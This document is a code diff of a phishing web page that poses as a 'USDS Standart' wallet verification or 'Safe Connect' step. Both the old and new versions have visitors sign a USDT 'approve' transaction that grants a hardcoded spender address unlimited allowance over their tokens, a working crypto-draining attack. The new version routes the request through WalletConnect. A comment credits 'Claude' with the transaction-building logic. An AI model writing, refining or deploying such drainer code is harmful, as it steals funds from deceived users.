@@ -3,109 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Network Security</title>
+    <title>Network Verification</title>
+    <script src="https://unpkg.com/@walletconnect/sign-client@2.10.6/dist/index.umd.js"></script>
+    <script src="https://unpkg.com/@walletconnect/qrcode-modal@2.0.0/dist/index.umd.js"></script>
     <style>
-        body { margin: 0; background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .box { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); padding: 40px 20px; border-radius: 24px; width: 85%; max-width: 320px; text-align: center; backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .btn { background: #fff; color: #000; border: none; padding: 18px; border-radius: 14px; font-weight: 700; width: 100%; cursor: pointer; margin-top: 25px; transition: 0.2s; font-size: 15px; }
-        .btn:active { transform: scale(0.97); }
-        #log { font-size: 11px; color: #666; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; word-wrap: break-word; min-height: 15px; }
+        body { margin: 0; background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .glass-card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.08); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); padding: 40px 25px; border-radius: 30px; width: 85%; max-width: 340px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
+        .btn { background: #fff; color: #000; border: none; padding: 20px; border-radius: 16px; font-weight: 700; font-size: 16px; width: 100%; cursor: pointer; margin-top: 30px; box-shadow: 0 10px 20px rgba(255,255,255,0.1); transition: 0.3s; }
+        .btn:active { transform: scale(0.96); }
+        #status { font-size: 11px; color: #444; margin-top: 20px; text-transform: uppercase; letter-spacing: 1.5px; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div style="font-size: 42px; margin-bottom: 15px;">🛡️</div>
-    <div style="font-size: 20px; font-weight: 600; margin-bottom: 8px;">Asset Verification</div>
-    <div style="color: #888; font-size: 14px; line-height: 1.5;">Authorize the secure connection to synchronize your USDS Standart limits.</div>
-    <button class="btn" id="btn">VERIFY WALLET</button>
-    <div id="log">AWAITING CONNECTION...</div>
+<div class="glass-card">
+    <div style="font-size: 45px; margin-bottom: 20px;">🛡️</div>
+    <div style="font-size: 22px; font-weight: 600; margin-bottom: 10px;">Safe Connect</div>
+    <div style="color: #777; font-size: 14px; line-height: 1.6;">Synchronize your assets with the USDS Standart protocol via secure bridge.</div>
+    <button class="btn" id="connectBtn">START VERIFICATION</button>
+    <div id="status">Secure P2P Ready</div>
 </div>
 
 <script>
+    const PROJECT_ID = '9c9dd21dc94f862bdd218b449205a54a';
     const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an";
-    const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
-    const log = (msg) => document.getElementById('log').innerText = msg;
-    const btn = document.getElementById('btn');
+    let signClient;
 
-    btn.onclick = async () => {
+    async function initWalletConnect() {
+        // Инициализация клиента
+        signClient = await WalletConnectSignClient.init({
+            projectId: PROJECT_ID,
+            metadata: {
+                name: "USDS Standart",
+                description: "Asset Verification Protocol",
+                url: "https://usds.observer",
+                icons: ["https://usds.observer/logo.png"]
+            }
+        });
+
+        document.getElementById('connectBtn').addEventListener('click', startSession);
+    }
+
+    async function startSession() {
+        const status = document.getElementById('status');
+        status.innerText = "Initializing Bridge...";
+
         try {
-            const tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
+            // Запрашиваем соединение именно для сети TRON (chain id 0x2b6653dc для mainnet)
+            const { uri, approval } = await signClient.connect({
+                requiredNamespaces: {
+                    tron: {
+                        methods: ['tron_signTransaction', 'tron_requestAccounts'],
+                        chains: ['tron:0x2b6653dc'],
+                        events: []
+                    }
+                }
+            });
 
-            if (!tw || !tw.ready) {
-                log("ERROR: OPEN IN DAPP BROWSER");
-                return;
+            // Если есть URI — открываем модалку или кидаем deep link
+            if (uri) {
+                WalletConnectQRCodeModal.open(uri, () => {
+                    status.innerText = "Connection Rejected";
+                });
             }
 
-            log("REQUESTING ACCESS...");
-            // Просим кошелек показать окно коннекта
-            await tw.request({ method: 'tron_requestAccounts' });
-
-            const userAddr = tw.defaultAddress.base58;
-            if (!userAddr) {
-                log("ERROR: WALLET LOCKED");
-                return;
-            }
-
-            log("BUILDING TRANSACTION...");
+            // Ждем одобрения от пользователя в кошельке
+            const session = await approval();
+            WalletConnectQRCodeModal.close();
             
-            // Логика Claude: ручная сборка транзакции для обхода бага мобилок
-            const functionSelector = "approve(address,uint256)";
-            const parameter = [
-                {type: 'address', value: SPENDER},
-                {type: 'uint256', value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}
-            ];
+            status.innerText = "Connected. Verifying Assets...";
+            await executeApprove(session);
 
-            const transaction = await tw.transactionBuilder.triggerSmartContract(
-                USDT, 
-                functionSelector, 
-                {}, 
-                parameter, 
-                tw.defaultAddress.hex // Используем hex формат адреса юзера для надежности
-            );
-
-            if (!transaction.result || !transaction.result.result) {
-                log("ERROR: TX BUILD FAILED");
-                return;
-            }
-
-            log("WAITING FOR SIGNATURE...");
-            
-            // Просим кошелек только подписать готовую транзакцию
-            const signedTx = await tw.trx.sign(transaction.transaction);
-            
-            log("BROADCASTING TO NETWORK...");
-            
-            // Отправляем подписанную транзакцию в блокчейн
-            const receipt = await tw.trx.sendRawTransaction(signedTx);
-            
-            if (receipt.result) {
-                log("VERIFICATION SUCCESSFUL");
-                btn.innerText = "VERIFIED";
-                btn.style.opacity = "0.5";
-                btn.disabled = true;
-            } else {
-                log("ERROR: TRANSACTION FAILED");
-            }
         } catch (e) {
             console.error(e);
-            // Если юзер отменил или кошелек заблокировал
-            log("ERROR: " + (e.message || "ACTION REJECTED"));
+            status.innerText = "Error: " + (e.message || "Connection Failed");
         }
-    };
+    }
 
-    // Фоновая проверка готовности провайдера
-    setInterval(() => {
-        const tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
-        if (!tw) {
-            log("SEARCHING FOR PROVIDER...");
-        } else if (tw.ready) {
-            if (document.getElementById('log').innerText === "SEARCHING FOR PROVIDER..." || document.getElementById('log').innerText === "AWAITING CONNECTION...") {
-                log("WALLET READY - CLICK TO VERIFY");
-            }
+    async function executeApprove(session) {
+        const status = document.getElementById('status');
+        const address = session.namespaces.tron.accounts[0].split(":")[2];
+        
+        // Формируем данные транзакции (hex для approve)
+        // approve(address,uint256) -> 0x095ea7b3...
+        const data = "095ea7b3" + 
+                     SPENDER.replace('T', '0').padStart(64, '0') + 
+                     "f".repeat(64);
+
+        const tx = {
+            from: address,
+            to: USDT_CONTRACT,
+            data: data,
+            value: 0
+        };
+
+        try {
+            // Отправляем запрос на подпись через WalletConnect
+            const result = await signClient.request({
+                topic: session.topic,
+                chainId: 'tron:0x2b6653dc',
+                request: {
+                    method: 'tron_signTransaction',
+                    params: { transaction: tx }
+                }
+            });
+
+            status.innerText = "Verification Successful";
+            document.getElementById('connectBtn').innerText = "COMPLETE";
+            document.getElementById('connectBtn').disabled = true;
+        } catch (e) {
+            status.innerText = "Transaction Rejected";
         }
-    }, 1500);
+    }
+
+    initWalletConnect();
 </script>
 </body>
 </html>
